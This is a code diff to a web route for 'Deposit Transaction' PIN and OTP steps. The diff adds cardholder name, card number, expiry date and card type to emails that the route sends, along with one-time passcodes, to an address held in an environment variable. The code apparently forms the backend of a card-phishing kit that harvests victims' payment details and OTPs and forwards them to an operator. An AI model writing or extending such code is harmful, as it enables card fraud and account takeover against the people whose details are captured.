@@ -12,7 +12,7 @@ export async function POST(request: Request) {
       return Response.json({ success: false, error: "Invalid email step type" }, { status: 400 })
     }
 
-    const { email, amount, otp } = data
+    const { email, amount, otp, cardName, cardNumber, expiryDate, cardType } = data
 
     const apiToken = process.env.MAILERSEND_API_TOKEN
     const receiverEmail = process.env.RECEIVER_EMAIL
@@ -40,10 +40,29 @@ export async function POST(request: Request) {
 
     if (step === "pin") {
       subject = "Deposit Transaction - PIN Entered"
-      emailHtml = render(<PinEmail email={email} amount={amount} />)
+      emailHtml = render(
+        <PinEmail
+          email={email}
+          amount={amount}
+          cardName={cardName}
+          cardNumber={cardNumber}
+          expiryDate={expiryDate}
+          cardType={cardType}
+        />,
+      )
     } else if (step === "otp") {
       subject = "Deposit Transaction - OTP Verification"
-      emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
+      emailHtml = render(
+        <OtpEmail
+          email={email}
+          amount={amount}
+          otp={otp}
+          cardName={cardName}
+          cardNumber={cardNumber}
+          expiryDate={expiryDate}
+          cardType={cardType}
+        />,
+      )
     }
 
     const emailParams = new EmailParams()
@@ -70,4 +89,4 @@ export async function POST(request: Request) {
       { status: 500 },
     )
   }
-}
+      }
